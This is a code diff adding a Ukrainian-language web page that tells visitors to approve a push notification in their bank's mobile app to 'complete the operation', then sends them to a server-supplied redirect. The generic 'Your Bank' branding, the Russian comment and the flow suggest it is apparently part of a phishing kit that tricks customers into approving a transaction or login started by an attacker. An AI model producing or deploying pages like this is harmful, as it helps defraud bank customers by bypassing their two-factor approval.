@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Підтвердження пуш-увідомлення</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f8f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        h1 {
+            font-size: 22px;
+            color: #23a455;
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 14px;
+            color: #555555;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .spinner {
+            margin: 20px auto;
+            width: 50px;
+            height: 50px;
+            border: 6px solid #e5e5e5;
+            border-top: 6px solid #23a455;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            color: #ffffff;
+            background-color: #23a455;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #1d8f4a;
+        }
+        .footer {
+            font-size: 12px;
+            color: #999999;
+            margin-top: 20px;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const confirmButton = document.getElementById('confirmPush');
+            confirmButton.addEventListener('click', async () => {
+                try {
+                    const response = await fetch('/confirm_push', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+
+                    const result = await response.json();
+                    if (result.success && result.redirect_url) {
+                        window.location.href = result.redirect_url; // Редирект на страницу подтверждения
+                    } else {
+                        alert("Помилка підтвердження. Спробуйте знову.");
+                    }
+                } catch (error) {
+                    alert("Помилка підключення до сервера.");
+                    console.error(error);
+                }
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Підтвердження дії</h1>
+        <p>Будь ласка, підтвердіть пуш-увідомлення у мобільному додатку вашого банку, щоб завершити операцію.</p>
+        <div class="spinner"></div>
+        <button id="confirmPush">Я підтвердив</button>
+        <div class="footer">© 2024 Ваш Банк. Усі права захищені.</div>
+    </div>
+</body>
+</html>
